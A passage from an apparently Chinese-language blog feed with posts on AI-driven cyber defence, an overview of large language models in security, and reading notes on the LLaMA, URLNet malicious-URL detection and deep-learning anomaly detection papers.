知识表示模型、网络安全知识语料库中的特定表达和网络安全知识之间特有的逻辑关系和对应关系，构建相应的网络安全本体模型，实现多领域知识的统一表示，相较于传统的知识图谱等知识表示模型，可提升融合效率和多领域动态知识统一表示的准确率。</li><li>在此基础上，针对半结构化数据和非结构化数据知识抽取难的问题，基于构建的本体模型，结合双向循环神经网络和条件随机场等深度学习方法，进行特征抽取、联合标记、类别标记等。对于未被识别出的本体进行人工抽取，从而确保基于本体模型生成的三元组知识在逻辑上是正确的，实现动态可扩展的网络安全知识大脑，为网络安全防御提供强大的具有自学习能力的知识库支撑。</li></ul><p>推动有效网络攻击的智能化检测</p><ul><li>针对网络攻击越来越智能化，大规模网络攻击越来越频繁，网络攻击的隐蔽性越来越高的特点，遵循网络攻击的基本规律，基于构建的网络安全知识库，实现复杂网络攻击的智能化检测算法。可将网络安全事件和攻击的基本信息存储于安全知识图谱中，通过采集数据与安全知识图谱进行匹配，根据状态的触发约束，可分析得到网络系统中的单步攻击和复合攻击。</li><li>一般而言，检测复合攻击时可以分析出攻击的当前阶段，无法确保输出完整攻击链，因此可进一步基于攻击规则库的复合攻击研判技术，将先验知识存入网络安全知识图谱和复合攻击规则库，基于大数据分析平台，通过采集数据与安全知识图谱进行匹配，再经过时空属性和复合攻击规则库的共同约束，从海量的数据中挖掘出有效的攻击链，并完善复合攻击的攻击链，实现自动化分析攻击目的和意图等。针对传统方法无法应对输入的数据中误报和漏报的情况，可以基于多模态数据的复合攻击研判，当输入的数据中存在误报和漏报的情况时，可以自动补全缺失的信息，并计算生成不同攻击链的概率，消除误报和漏报的影响。进一步，可通过网络仿真平台对攻击事件进行仿真，将分析结果与仿真攻击的信息进行对比，实现对有效网络攻击的智能研判。</li></ul><p>评估人工智能技术的安全性，推动人工智能技术的良性应用</p><ul><li>在制定人工智能的发展路线的同时应该要紧盯风险防御，加强对潜在风险的预判和研究，注重系统安全防御技术的发展，明确防御发展策略。</li><li>同时，应加强人工智能风险管理。人工智能自身存在的漏洞和人工智能技术的滥用是系统安全防御中很难避免的环节。自身存在的安全风险属于最致命的问题，应用越广泛，其带来的危害性也越大。系统安全防御技术要从人工智能技术自身入手，构建主动免疫的计算构架，尽可能地降低技术自身的漏洞危害，不断创新保持技术优势。</li></ul><h3 id="鼓励合作与跨界合作的重要性"><a href="#鼓励合作与跨界合作的重要性" class="headerlink" title="鼓励合作与跨界合作的重要性"></a>鼓励合作与跨界合作的重要性</h3><p>人工智能最重要的因素是数据，然而受限于隐私和数据安全，注定了网络安全领域的数据难以共享，无法建立统一的数据集或语料库。单靠某一家安全公司或企业难以实现宏大的目标，所以需要有着完善及合作机制，甚至是实现跨界合作，集万家之所长。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h2&gt;&lt;p&gt;本文论题为《智能防线：AI 驱动的网络空间防御体系》，主要从人工智能在网络空间安全智能防御体系中的现状、挑战、机遇与应用前景等方面综合阐述 AI + 智能防御的理念。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="IA" scheme="https://coldwave96.github.io/tags/IA/"/>
    
    <category term="GenAI" scheme="https://coldwave96.github.io/tags/GenAI/"/>
    
  </entry>
  
  <entry>
    <title>Large Language Model (LLM) 漫谈</title>
    <link href="https://coldwave96.github.io/2023/06/28/LLM/"/>
    <id>https://coldwave96.github.io/2023/06/28/LLM/</id>
    <published>2023-06-28T07:53:28.000Z</published>
    <updated>2023-06-28T07:53:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从 ChatGPT 上线以来，LLM (Large Language Model) 的热潮席卷了各行各业。Meta 开源的 LLaMA 模型给头部玩家进入这一领域提供了导航，Standford Alpaca 和 Microsoft LoRA 给小玩家们提供了低成本的玩法，总之只要想玩，人人可上手（PS. 老黄真的是秦始皇吃花椒 - 赢麻了，前有矿潮，后有AI，臭打游戏的能有几个钱，无足挂齿）。LLM 从刚开始的通用模型，到现在各个行业都在考虑垂直领域中的应用，网络安全领域当然也不例外。</p><span id="more"></span><h2 id="发展背景"><a href="#发展背景" class="headerlink" title="发展背景"></a>发展背景</h2><p>LLM 的崛起主要取决于3方面的因素：数据，算力，算法。</p><p>首先是数据方面，在信息爆炸的年代，加上元宇宙， WEB3 等概念的加持，数据上云，全民共享成为了时代的主流。在线社交网络，万物互联的物联网，移动互联网都为 LLM 提供了丰富的语料数据，Github 等代码托管平台提供了丰富的高质量代码数据……</p><p>然后是算力方面，归功于半导体行业的产业迭代带来的硬件支持，以及 NVIDIA 开启的 GPU 加速时代，老黄不遗余力发展的 CUDA，cuDNN 等配套软件支持。TensorFlow，Pytorch 为代表的 AI 框架降低了这一领域的门槛，同时也拉高了上限，以及 DeepSpeed 等并行计算框架带来的算力的成倍增长。</p><p>最后是算法方面，深度学习算法的迭代更新速度飞快，以 Transformer 为代表的算法框架逐渐突破了原来对深度网络结构的限制。</p><p>总之，现在的 LLM 崛起是量变引起质变的过程。</p><h2 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h2><p>2017年由 Google 团队提出的 Transformer 模型，是目前所有大语言模型的基础架构。</p><p>Attention is All You Need：<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p><center>    <img src="/img/LLM/LLM1.png" width="850"></center><p>图中最右边的结构是论文中 Transformer 的内部结构图，左侧为 Encoder block，右侧为 Decoder block，Encoder 和 Decoder 都包含 6 个 block。红色圈中的部分为 Multi-Head Attention，是由多个 Self-Attention组成的，可以看到 Encoder block 包含一个 Multi-Head Attention，而 Decoder block 包含两个 Multi-Head Attention (其中有一个用到 Masked)。Multi-Head Attention 上方还包括一个 Add &amp; Norm 层，Add 表示残差连接 (Residual Connection) 用于防止网络退化，Norm 表示 Layer Normalization，用于对每一层的激活值进行归一化。</p><p>图中最左边是 Self-Attention 的结构，在计算的时候需要用到矩阵Q(查询),K(键值),V(值)。在实际中，Self-Attention 接收的是输入(单词的表示向量x组成的矩阵X) 或者上一个 Encoder block 的输出。而Q,K,V正是通过 Self-Attention 的输入进行线性变换得到的。</p><p>图中左二 Multi-Head Attention 是由多个 Self-Attention 组合形成。</p><p>关于 Transformer 的更多细节介绍参考<a href="https://zhuanlan.zhihu.com/p/338817680">这里</a>。</p><center>    <img src="/img/LLM/LLM2.png" width="850"></center><p>GPT 和 BERT都是基于 Transformer 的与训练语言模型，都是通过“预训练+微调”的模式完成下游任务的搭建。GPT是单向模型，只利用上文信息推断下文，而BERT是双向模型。GPT 基于自回归模型，可完成 NLU（Natural Language Understanding）和 NLG（Natural Language Generation）任务。原生 BERT 基于自编码模型，无法直接应用于文本生成任务。</p><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><center>    <img src="/img/LLM/LLM3.png" width="850"></center> <p>LLM 的发展经历了多年的积累，从单纯的 NLP 任务转变成为现在的多模态模型，也引申出了 Prompt 工程的概念，涉及到 AI Ethics 的内容也逐渐被重视。随着大语言模型的逐渐开源化和社区化，未来一定是越来越好的。</p><h2 id="垂直领域"><a href="#垂直领域" class="headerlink" title="垂直领域"></a>垂直领域</h2><p>LLM 带来的变革深入各个产业，于是垂直领域的 LLM 越来越成为焦点。但是这里面临的主要问题是数据源，各个垂直领域有关数据的开放程度不尽相同。以网络安全领域为例，各家的安全数据不仅不可能共享，甚至公司内部也权限森明，导致了安全领域的 LLM 必然面临着数据源不充足的问题。</p><p>与此同时，LLM 对安全领域带来的冲击也是巨大的。</p><p>对于攻击方来说，攻击手段更为普及，高级攻击手段的门槛降低。通过 LLM 可以快速生成各种各样的高级混淆手段，定向的钓鱼邮件，钓鱼页面也可以通过 LLM 快速定制。攻击方的攻击速度也大大提升，绕过手法可以快速迭代，漏洞利用代码也能快速开发，1 Day 可能真的就是物理意义上的“1 Day”。</p><p>然而与之相对的防守方，LLM 加剧了与攻击方人员的能力、知识、技术的不对等，无法面对高级攻击常态化的趋势。防守方传统的防守手段高度依赖高水平的安全人员，然而现状却是安全人员的长期缺乏。同时防守方的自动化能力不足，迫切的需要机器对抗机器的手段。</p><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>想要构建一个大语言模型，首先第一步是要预训练出一个初步的 NLP 模型，目的是通过给定的 Token， 能够预测下一个 Token。</p><center>    <img src="/img/LLM/LLM4.png" width="850"></center><p>具体方式通过计算模型预测的下一个单词与真实的下一个单词之间的误差，通过算法获取降低误差的梯度，传播梯度更新模型参数。</p><center>    <img src="/img/LLM/LLM5.png" width="850">    <img src="/img/LLM/LLM6.png" width="850"></center><p>第二步是微调 Fine-Tune， 收集特定领域的数据，由该领域额专家对这些数据进行精心标注，通过上一步类似的训练手段，进一步更新模型的参数权重。</p><center>    <img src="/img/LLM/LLM7-1.png" width="850">    <img src="/img/LLM/LLM7-2.png" width="850"></center><p>微调完成之后的模型就已经有了不错的变表现，可以部署推理了。输入一个句子，预测每个单词出现的频率，将频率最大的作为输出，循环往复，直到遇到终止符。</p><center>    <img src="/img/LLM/LLM8.png" width="850"></center><h3 id="训练流程"><a href="#训练流程" class="headerlink" title="训练流程"></a>训练流程</h3><p>一个完整 LLM 构建流程其实包含4步，除了前面说的预训练和微调之后，还需要通过奖励模型以及强化学习的手段进一步加强模型的能力。</p><center>    <img src="/img/LLM/LLM9.png" width="850"></center><h2 id="建设方案"><a href="#建设方案" class="headerlink" title="建设方案"></a>建设方案</h2><h3 id="二次复现"><a href="#二次复现" class="headerlink" title="二次复现"></a>二次复现</h3><p> Meta 放出的 LLaMA 模型基本做到了全开源，根据<a href="http://arxiv.org/abs/2302.13971">论文</a>中的信息，LLaMA 的全部数据源均可获取，训练模型的超参数也基本公布，在模型结构上做的调整也详细列出，这就意味着 LLaMA 的结果完全可以复刻。</p><center>    <img src="/img/LLM/LLM10.png" width="850">    <img src="/img/LLM/LLM11.png" width="850">    <img src="/img/LLM/LLM12.png" width="850"></center><h3 id="权重微调"><a href="#权重微调" class="headerlink" title="权重微调"></a>权重微调</h3><p>对于财力和实力不够的玩家来说，微调是另一个可行的建设方案，无论是基于 LLaMA 还是 THUDM&#x2F;GLM 模型的微调都能够在垂直领域有一定的效果。但是考虑到数据、基础语料以及模型权重的 License 等问题，想要有非常好的效果也是不现实的。</p><p>微调的方式目前有很多，比如 <a href="https://github.com/tatsu-lab/stanford_alpaca">Stanford Alpaca</a>、<a href="https://github.com/tloen/alpaca-lora">LoRA</a>、<a href="https://github.com/THUDM/P-tuning-v2">P-Tuning v2</a> 等。</p><center>    <img src="/img/LLM/LLM13.png" width="850">    <img src="/img/LLM/LLM14.png" width="850"></center><h2 id="研究进展"><a href="#研究进展" class="headerlink" title="研究进展"></a>研究进展</h2><h3 id="项目推进"><a href="#项目推进" class="headerlink" title="项目推进"></a>项目推进</h3><p>目前在推进的是 LLM 在安全领域的应用，覆盖两种建设方案。在权重微调方面，基于 LLaMA 模型，结合蜜罐数据，尝试将大语言模型作为蜜罐后台，模拟服务端的返回。此外也在尝试通过安全专家标注的网络攻击数据，训练 LLM 对网络攻击的检测能力，并提供判断思路。</p><p>由于目前开放的大模型都涉及到 License 问题，研究学习当然没问题，一旦从产品的角度考虑商用，就会收到权重的限制。所以需要重新进行预训练，调整模型的全部权重，其实也就是在做复现 LLaMA 的工作。</p><p>LangChain + LLM 的思路也很值得尝试。通过 LangChain 将本地的大量的威胁情报和 LLM 结合，制作本地知识库也是目前推动的方向。</p><h3 id="发展方向"><a href="#发展方向" class="headerlink" title="发展方向"></a>发展方向</h3><p>除了 Prompt 工程以外，培养模型的链式思维（Chain of Thoughts）也是热门方向。链式思维主要是培养模型的 Zero-Shot 能力，对于安全领域来说，这一方向的意义在于希望 LLM 能够在无样本的情况下检测 0 Day 攻击。</p><center>    <img src="/img/LLM/LLM15.png" width="850"></center><p>安全领域的 LLM 整体解决方案目前看来有两种。一种是将 LLM 作为分析中台，所有的数据通过 LLM 进行分析，通过其开放的 API 接口获取结果。另一种是将 LLM 作为调度中台以及人机交互接口，所有的安全数据由 LLM 调度分发，通过更简单快捷的小模型及其他分析引擎处理分析，分析结果整合成为一个统一的数据格式交由 LLM 与用户沟通，用更简单通俗的自然语言充当一个安全专家的形象。</p><p>虽然目前 LLM 还有很多问题，但是起码让我们看到了它的潜力，希望这是黎明前的那道曙光，身前一片坦途。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;自从 ChatGPT 上线以来，LLM (Large Language Model) 的热潮席卷了各行各业。Meta 开源的 LLaMA 模型给头部玩家进入这一领域提供了导航，Standford Alpaca 和 Microsoft LoRA 给小玩家们提供了低成本的玩法，总之只要想玩，人人可上手（PS. 老黄真的是秦始皇吃花椒 - 赢麻了，前有矿潮，后有AI，臭打游戏的能有几个钱，无足挂齿）。LLM 从刚开始的通用模型，到现在各个行业都在考虑垂直领域中的应用，网络安全领域当然也不例外。&lt;/p&gt;</summary>
    
    
    
    <category term="Theories" scheme="https://coldwave96.github.io/categories/Theories/"/>
    
    <category term="AI" scheme="https://coldwave96.github.io/categories/Theories/AI/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>LLaMA - Open and Efficient Foundation Language Models</title>
    <link href="https://coldwave96.github.io/2023/03/28/LLaMA/"/>
    <id>https://coldwave96.github.io/2023/03/28/LLaMA/</id>
    <published>2023-03-28T05:27:39.000Z</published>
    <updated>2023-03-28T05:27:39.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：LLaMA: Open and Efficient Foundation Language Models</li><li>作者：Hugo Touvron, Thibaut Lavril, Gautier Izacard, Xavier Martinet Marie-Anne Lachaux, Timothee Lacroix, Baptiste Rozière, Naman Goyal Eric Hambro, Faisal Azhar, Aurelien Rodriguez, Armand Joulin Edouard Grave, Guillaume Lample - Meta AI</li><li>原文链接：<a href="http://arxiv.org/abs/2302.13971">LLaMA: Open and Efficient Foundation Language Models</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>训练了一系列的语言模型在不同的推断预算上实现最佳表现，模型参数从7B到65B不等。其中，13B模型大多数 benchmarks 表现超越 GPT-3，规模只有 GPT-3 的十分之一。65B模型能够和最大最好的语言模型 Chinchilla 或 PaLM-540B 竞争。</li><li>65B模型在2048张A100（80GB RAM）的集群，包含1.4T tokens的数据集情况下，训练时间为约为21天。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>通过多头注意力（Multi-head attention）机制减少内存使用以及运行时间。具体实现为不存储 attention 权重，不计算 key&#x2F;query 的分数。</li><li>为了提升训练效率，减少了 backword pass 过程中重新计算 avtivations 的数量。更准确的说，保存了很难计算的 activations，比如线性层的输出。实际是通过手动实现 transformer 层的 backward 功能函数，而不是依赖于 PyTorch 提供的 autograd 方法。</li><li>尽可能多的重叠 activations 以及 GPU 之间通过网络的交流两部分产生计算（通过 all_reduce 操作）。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Pre-training-Data"><a href="#Pre-training-Data" class="headerlink" title="Pre-training Data"></a>Pre-training Data</h3><ul><li>English CommonCrawl：通过 fastText 线性分类器预处理了 CCNet pipeline【1】获取的数据，去除了非英语页面，并通过一个 n-gram 语言模型过滤掉了低质量内容。</li><li>C4：公开可获取的数据集，同样包含去重和语言识别等预处理过程。</li><li>Github：在 Google BigQuery 上可公开获取的公共 Github 数据集。</li><li>Wikipedia：覆盖20种语言，去除了超链接，评论和其他格式化的内容。</li><li>Gutenberg and Books3：从书籍层面去重，转化为数据集。</li><li>ArXiv：去除第一节之前的部分，引用，评论，行内扩展的定义等作为科研类数据集。</li><li>Stack Exchange：高质量的问答类数据，覆盖多元领域。</li></ul><center>    <img src="/img/LLaMA/1.png" width="850"></center><p>分词器（Tokenizer）基于 bytepair encoding（BPE）算法【2】，具体实现参考 SentencePiece【3】。处理完成之后，整体数据集大约包含1.4T tokens。除了 Wikipedia 和 Books 的数据运行了大约 2 轮之外，其他数据只使用一次。</p><h3 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h3><ul><li>神经网络基于 transformer architecture【4】，改进点如下：<ul><li>Pre-normalization [GPT3]：每一个 transformer sub-layer，通过 RMSNorm 归一化函数【5】归一化输入而不是输出。</li><li>SwiGLU activation function [PaLM]：用 SwiGLU 激活函数【6】替换 ReLU。PaLM 中维度数据使用（2&#x2F;3）4d而非4d。</li><li>Rotary Embeddings [GPTNeo]：移除绝对位置嵌入（absolute positional embeddings），加入 rotary positional embeddings（RoPE）【7】。</li></ul></li></ul><h3 id="Optimizer"><a href="#Optimizer" class="headerlink" title="Optimizer"></a>Optimizer</h3><ul><li>Optimizer 使用 the AdamW optimizer【8】，超参数 β1 &#x3D; 0.9，β2 &#x3D; 0.95。最终学习速率是最大学习速率的10%。weight decay 为 0.1，gradient clipping 为 1.0，warmup steps 为 2000。</li><li>优化的具体实现可通过 <a href="https://github.com/facebookresearch/xformers">xformers库</a>。</li></ul><center>    <img src="/img/LLaMA/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>以更小的模型体积实现更好的性能，降低了大语言模型实用场景的门槛。</li><li>技术特点均有提及，训练集均可获得，过程复现的可能性大，但仍需要进一步研究。</li><li>Finetuning 的过程及技术未提及。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><p>Guillaume Wenzek, Marie-Anne Lachaux, Alexis Conneau, Vishrav Chaudhary, Francisco Guzmán, Armand Joulin, and Edouard Grave. 2020. CCNet: Extracting high quality monolingual datasets from web crawl data. In Language Resources and Evaluation Conference.</p><p> <a href="https://aclanthology.org/2020.lrec-1.494/">CCNet: Extracting High Quality Monolingual Datasets from Web Crawl Data</a></p></li><li><p>Rico Sennrich, Barry Haddow, and Alexandra Birch. 2015. Neural machine translation of rare words with subword units. arXiv preprint arXiv:1508.07909.</p><p> <a href="https://arxiv.org/abs/1508.07909">Neural Machine Translation of Rare Words with Subword Units</a></p></li><li><p>Taku Kudo and John Richardson. 2018. Sentencepiece: A simple and language independent subword tokenizer and detokenizer for neural text processing. arXiv preprint arXiv:1808.06226.</p><p> <a href="https://arxiv.org/abs/1808.06226">SentencePiece: A simple and language independent subword tokenizer…</a></p></li><li><p>Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N Gomez, Ł ukasz Kaiser, and Illia Polosukhin. 2017. Attention is all you need. In Advances in Neural Information Processing Systems 30, pages 5998–6008.</p><p> <a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p></li><li><p>Biao Zhang and Rico Sennrich. 2019. Root mean square layer normalization. Advances in Neural Information Processing Systems, 32.</p><p> <a href="https://arxiv.org/abs/1910.07467">Root Mean Square Layer Normalization</a></p></li><li><p>Noam Shazeer. 2020. Glu variants improve transformer. arXiv preprint arXiv:2002.05202.</p><p> <a href="https://arxiv.org/abs/2002.05202">GLU Variants Improve Transformer</a></p></li><li><p>Jianlin Su, Yu Lu, Shengfeng Pan, Ahmed Murtadha, Bo Wen, and Yunfeng Liu. 2021. Roformer: Enhanced transformer with rotary position embedding. arXiv preprint arXiv:2104.09864.</p><p> <a href="https://arxiv.org/abs/2104.09864">RoFormer: Enhanced Transformer with Rotary Position Embedding</a></p></li><li><p>lya Loshchilov and Frank Hutter. 2017. Decoupled weight decay regularization. arXiv preprint arXiv:1711.05101.</p><p> <a href="https://arxiv.org/abs/1711.05101">Decoupled Weight Decay Regularization</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：LLaMA: Open and Efficient Foundation Language Models&lt;/li&gt;
&lt;li&gt;作者：Hugo Touvron, Thibaut Lavril, Gautier Izacard, Xavier Martinet Marie-Anne Lachaux, Timothee Lacroix, Baptiste Rozière, Naman Goyal Eric Hambro, Faisal Azhar, Aurelien Rodriguez, Armand Joulin Edouard Grave, Guillaume Lample - Meta AI&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;http://arxiv.org/abs/2302.13971&quot;&gt;LLaMA: Open and Efficient Foundation Language Models&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
  </entry>
  
  <entry>
    <title>URLNet - Learning a URL Representation with Deep Learning for Malicious URL Detection</title>
    <link href="https://coldwave96.github.io/2023/03/23/URLNet/"/>
    <id>https://coldwave96.github.io/2023/03/23/URLNet/</id>
    <published>2023-03-23T03:57:10.000Z</published>
    <updated>2023-03-23T03:57:10.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：URLNet: Learning a URL Representation with Deep Learning for Malicious URL Detection</li><li>作者：Hung Le, Quang Pham, Doyen Sahoo, Steven C.H. Hoi</li><li>原文链接：<a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#225ae0a525f64fa8b9d0fdf24a921202">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>传统的恶意Url检测局限于黑名单，导致难以快速反应，同时无法检测不在黑名单中的未知恶意Url。</li><li>为了解决传统黑名单检测带来的滞后性，机器学习算法的介入提供了全新的方向。但是传统的机器学习算法依赖于特征提取技术。目前词袋模型作为最常用的语义特征提取技术，在面对恶意Url检测时存在许多挑战。比如难以准确的截取极具特征的字符串片段，无法学习到未知特征等。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>论文提出了基于深度学习的恶意Url检测方案URLNet，从字符以及词两种维度分别进行表示，通过CNN网络训练学习，最后结合两种种维度的特征获取结果。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><ul><li>样本中的URL统一只保留前200个字节，多余的部分截断，不足的部分用<PAD>填充。<center>  <img src="/img/URLNet/1.png" width="850"></center><center>  <img src="/img/URLNet/2.png" width="850"></center></li><li>特征提取<ul><li>Whole URL BoW<ul><li>Bag of Words</li><li>独特词的数量</li></ul></li><li>URL Component Tokenisation (UCT)。将URL分成主域名，路径，最终路径标识，最顶层域名。对每个部分分别建立BoW字典。</li><li>Position Sensitive &amp; Bigrams (PSB)。特殊字符如域名和路径会被提取出来组成大的字符，同时标记其相对位置。</li><li>Character Trigrams。通过3个字符大小的滑动窗口处理URL中的域名生成新的tokens。</li><li>其他统计学特征：URL长度，hostname长度，URL中点的个数等。这些特征由具备专业知识的人员设计。</li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>文章提出了一种全新的基于语义的深度学习恶意Url检测模型，提供了从单个字符及单个词两种角度结合的分析视角，值得借鉴。</li><li>在从词的角度进行分析的网络中，论文在传统词袋模型之外提出了一些新的特征处理方法，并通过实验结果验证了有效性。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#face0efdfdb3455a9c1b48d6122295f9">Aaron Blum, Brad Wardman, Thamar Solorio, and Gary Warner. 2010. Lexical feature based phishing URL detection using online learning. In Proceedings of the 3rd ACM Workshop on Artificial Intelligence and Security. ACM, 54–60.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/Antimalweb/URLNet">URLNet</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Info&quot;&gt;&lt;a href=&quot;#Info&quot; class=&quot;headerlink&quot; title=&quot;Info&quot;&gt;&lt;/a&gt;Info&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;名称：URLNet: Learning a URL Representation with Deep Learning for Malicious URL Detection&lt;/li&gt;
&lt;li&gt;作者：Hung Le, Quang Pham, Doyen Sahoo, Steven C.H. Hoi&lt;/li&gt;
&lt;li&gt;原文链接：&lt;a href=&quot;https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#225ae0a525f64fa8b9d0fdf24a921202&quot;&gt;arxiv&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Essay" scheme="https://coldwave96.github.io/categories/Essay/"/>
    
    <category term="Notes" scheme="https://coldwave96.github.io/categories/Essay/Notes/"/>
    
    
    <category term="NLP" scheme="https://coldwave96.github.io/tags/NLP/"/>
    
    <category term="Deep Learning" scheme="https://coldwave96.github.io/tags/Deep-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Deep Learning for Anomaly Detection - A Review</title>
    <link href="https://coldwave96.github.io/2023/03/21/DLforAD/"/>
    <id>https://coldwave96.github.io/2023/03/21/DLforAD/</id>
    <published>2023-03-21T05:36:58.000Z</published>
    <updated>2023-03-21T05:36:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：Deep Learning for Anomaly Detection: A Review</li><li>作者：<ul><li>GUANSONG PANG, University of Adelaide</li><li>CHUNHUA SHEN, University of Adelaide</li><li>LONGBING CAO, University of Technology Sydney</li><li>ANTON VAN DEN HENGEL, University of Adelaide</li></ul></li><li>原文链接：<a href="https://arxiv.org/abs/2007.02500">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>异常检测（Anomaly &#x2F; Outlier &#x2F; Novelty detection）在过去的几十年里都是热门研究话题，但是仍然存在许多复杂的问题和挑战需要更进一步的研究。</li><li>这篇论文主要介绍了基于深度学习的异常检测技术，涵盖了3大类，11个小类的理论方法。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>问题本质和挑战。作者提到了异常检测中遇到的特殊问题的复杂度以及由此造成的许多未解决的挑战。</li><li>问题分类和总结。本文将现有的深度学习异常检测方法归总为3中理论框架：深度学习普遍特征提取，正常样本的表示，端到端异常分数学习。所有的方法从11个不同的建模层面进行的分类。</li><li>深度解析其他的论文研究内容。</li><li>未来的机遇与挑战。</li><li>源代码及数据集。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><ul><li><p>由于异常检测问题本身的特质导致的复杂性：</p><ul><li>未知性</li><li>异常与异常之间就有着不同的特征</li><li>异常样本数量极少导致的黑白样本比例极不均衡</li><li>异常类型的多种多样<ul><li>点异常</li><li>条件异常</li><li>组异常</li></ul></li></ul></li><li><p>深度学习异常检测面临的挑战</p><ul><li>CH1：低recall rate（样本中的正例多少被预测正确， TP&#x2F;TP+FN）</li><li>CH2：面对高维数据或者相互不独立数据表现一般，如何降维以及降维后如何保证原有信息完整也是挑战</li><li>CH3：由于数据量的有限，如何提高数据使用的有效性。监督学习需要大量的有标签数据，非监督学习依赖于对于异常分布的正确假设，半监督学习是一种解决方向。另一种解决方向是<code>weakly-supervised anomaly detection</code></li><li>CH4：许多弱监督&#x2F;半监督算法抗噪能力不好</li><li>CH5：现有很多异常检测算法均针对点异常，面对上下文异常及组异常效果不好</li><li>CH6：模型可解释性不强，面对某些争议难以合理解释<center>  <img src="/img/DLforAD/1.png" width="800"></center></li></ul></li><li><p>深度学习异常检测方法分类</p><center>  <img src="/img/DLforAD/2.png" width="850"></center></li><li><p>深度学习特征提取</p><ul><li>直接运用流行的深度学习模型AlexNet【1】，VGG【2】，ResNet【4】等提取低维度特征</li><li>训练深度学习特征提取模型进行异常分数评估</li></ul></li><li><p>正常样本表示</p><ul><li>通用正常特征学习，优化通用样本数据特征表示方法<ul><li>Autoencoder（AE）</li><li>GAN-based 异常检测</li><li>基于预测模型的特征学习方法，用之前的数据实例预测现在的数据实例</li><li>自监督学习</li></ul></li><li>针对存在的已知异常特殊优化的异常评估模型<ul><li>基于距离的评估手段</li><li>针对单类型的异常分类器</li><li>基于聚类的评估手段</li></ul></li><li>端到端异常评分学习 - 